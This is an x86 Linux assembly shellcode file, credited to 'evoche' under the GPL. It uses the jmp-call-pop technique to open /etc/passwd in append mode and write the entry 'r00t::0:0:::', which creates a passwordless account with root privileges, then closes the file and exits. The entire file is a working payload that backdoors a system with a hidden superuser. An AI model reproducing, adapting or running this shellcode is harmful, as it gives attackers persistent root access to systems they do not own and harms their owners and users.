;Author:   evoche
;License:  GPL

global _start

section .text

_start:

	jmp short call_shellcode 

shellcode: 

; open("/etc//passwd", O_WRONLY | O_APPEND)
	pop esi										;pop memory address of string into esi

	push byte 5
	pop eax
	xor ecx, ecx
	push ecx
	;push 0x64777373							;dont use code generated on stack
	;push 0x61702f2f
	;push 0x6374652f
	;mov ebx, esp
	mov ebx, esi								;use file_User string, file path is null terminated /etc/passed/0			
	mov cx, 02001Q
	int 0x80
	 
	mov ebx, eax
;write(ebx, "r00t::0:0:::", 12)
	push byte 4
	pop eax
	xor edx, edx
	push edx
	;push 0x3a3a3a30							;dont use code generated on stack
	;push 0x3a303a3a
	;push 0x74303072
	lea ecx, [esi + 12]							;get the memory address of the user to be added - 12 bytes from original popped value
	push byte 12
	pop edx
	int 0x80
 
; close(ebx)
	push byte 6
	pop eax
	int 0x80
 
; exit()
	push byte 1
	pop eax
	int 0x80

call_shellcode:

	call shellcode
	file_User: db "/etc/passwd",0x0,"r00t::0:0:::",0x0




